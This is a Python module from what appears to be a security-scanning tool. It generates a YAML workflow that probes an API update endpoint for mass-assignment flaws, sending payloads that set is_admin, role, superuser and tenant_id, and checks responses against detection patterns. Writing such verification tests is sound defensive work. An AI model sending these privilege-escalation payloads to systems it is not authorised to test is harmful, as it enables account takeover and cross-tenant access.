"""Mass-assignment test blueprint — flyto-core YAML.

Probes whether an update endpoint accepts fields the caller shouldn't be
able to set (is_admin, role, verified, tenant_id). Oracle: the response
echoes or quietly accepts the privileged field.
"""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


_PRIVILEGED_FIELD_MARKERS = [
    '"is_admin":true',
    '"is_admin": true',
    '"role":"admin"',
    '"role": "admin"',
    '"verified":true',
    '"superuser":true',
]


def generate(finding: SecurityFinding, target_url: str, auth_token: str | None) -> str:
    method = (finding.http_method or "PATCH").upper()
    path = finding.endpoint_path or "/api/users/me"
    url = f"{target_url}{path}"

    baseline_body = {"name": "Alice", "email": "alice@example.com"}
    privileged_payloads = [
        {"name": "Alice", "is_admin": True},
        {"name": "Alice", "role": "admin"},
        {"name": "Alice", "verified": True, "superuser": True},
        {"name": "Alice", "tenant_id": "other-tenant", "owner_id": "attacker"},
    ]

    headers = {"Content-Type": "application/json"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    probe_requests = [{"method": method, "url": url, "headers": headers, "body": baseline_body, "label": "baseline"}]
    for i, body in enumerate(privileged_payloads, 1):
        probe_requests.append({"method": method, "url": url, "headers": headers, "body": body, "label": f"priv_{i}"})

    workflow = {
        "id": "verify_mass_assignment",
        "name": f"Mass Assignment Verify at {path}",
        "version": "1.0.0",
        "description": f"Auto-generated mass-assignment verification at {finding.source_file}:{finding.source_line}",
        "timeout": 120,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start", "params": {}, "orderIndex": 0},
            {
                "id": "ma_probes",
                "module": "http.batch",
                "label": "Mass Assignment Probes",
                "params": {
                    "description": "Baseline safe body + 4 payloads including privileged fields",
                    "requests": probe_requests,
                    "timeout": 10,
                    "ssrf_protection": False,
                    "detect_patterns": _PRIVILEGED_FIELD_MARKERS,
                },
                "orderIndex": 1,
            },
            {
                "id": "assert_mass_assign",
                "module": "test.assert_contains",
                "label": "Assert Privileged Field Accepted",
                "params": {
                    "source": "${ma_probes.items}",
                    "patterns": _PRIVILEGED_FIELD_MARKERS,
                    "match_mode": "any",
                    "on_match": "exploitable",
                    "on_no_match": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_mass_assign.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "ma_probes"},
            {"source": "ma_probes", "target": "assert_mass_assign"},
            {"source": "assert_mass_assign", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)
